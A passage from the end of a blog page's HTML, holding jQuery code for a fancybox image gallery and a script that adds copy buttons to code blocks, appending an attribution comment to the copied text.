href="'+a+'"></a>').parent("a")),r.attr("data-fancybox","images"),e&&r.attr("data-caption",e)}),$().fancybox({selector:'[data-fancybox="images"]',hash:!1,loop:!1})})</script><style>.copy-btn{display:inline-block;padding:6px 12px;font-size:13px;font-weight:700;line-height:20px;color:#333;white-space:nowrap;vertical-align:middle;cursor:pointer;background-color:#eee;background-image:linear-gradient(#fcfcfc,#eee);border:1px solid #d5d5d5;border-radius:3px;user-select:none;outline:0}.highlight-wrap .copy-btn{transition:opacity .3s ease-in-out;opacity:0;padding:2px 6px;position:absolute;right:4px;top:8px;z-index:2}.highlight-wrap .copy-btn:focus,.highlight-wrap:hover .copy-btn{opacity:1}.highlight-wrap{position:relative}</style><script>addLoadEvent(()=>{$(".highlight").each(function(t,e){var n=$("<div>").addClass("highlight-wrap");$(e).after(n),n.append($("<button>").addClass("copy-btn").append("复制").on("click",function(t){var e=$(this).parent().find(".code")[0].innerText,n=(e+="\n/**\n* 感谢您复制代码，使用代码请注明引用出处\n* j3fffff @ https://j3f5.github.io\n*/",document.createElement("textarea")),e=(document.body.appendChild(n),n.style.position="absolute",n.style.top="0px",n.style.left="0px",n.value=e,n.select(),n.focus(),document.execCommand("copy"));document.body.removeChild(n),e?$(this).text("复制成功"):$(this).text("复制失败"),$(this).blur()})).on("mouseleave",function(t){var e=$(this).find(".copy-btn");setTimeout(function(){e.text("复制")},300)}).append(e)})})</script></body></html>